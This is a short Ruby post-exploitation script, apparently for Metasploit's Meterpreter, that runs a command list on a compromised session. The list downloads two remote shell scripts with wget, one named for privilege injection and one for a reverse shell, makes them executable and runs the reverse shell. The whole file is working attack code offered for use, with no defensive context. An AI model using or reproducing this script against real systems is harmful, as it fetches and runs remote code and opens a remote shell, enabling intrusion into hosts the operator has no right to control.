def injectPrivileged(session, cmdlst)
    print_status("Running Command List ...")
    r=''
    session.response_timeout=2
    cmdlst.each do |cmd|
        begin
            print_status "running command #{cmd}"
            r = session.sys.process.execute("#{cmd}", nil, {'Hidden' => false, 'Channelized' => true})
            while(d = r.channel.read)
                print_status("#{d}")
            end
            r.channel.close
            r.close
        rescue ::Exception => e
            print_status("Connection was closed, successfully killed tomcat")
        end
    end
end

command_list = [
    "wget https://gist.githubusercontent.com/Naramsim/90c6adb4c3ef390bd68050f8377c0fa6/raw -O /tmp/injectPrivileged.sh",
    "wget https://gist.githubusercontent.com/Naramsim/18dfdeebfd219665be8046bbba257f84/raw -O /tmp/reverseShell.sh",
    "chmod +x /tmp/injectPrivileged.sh",
    "chmod +x /tmp/reverseShell.sh",
    "/bin/bash /tmp/reverseShell.sh"
]

injectPrivileged(client, command_list)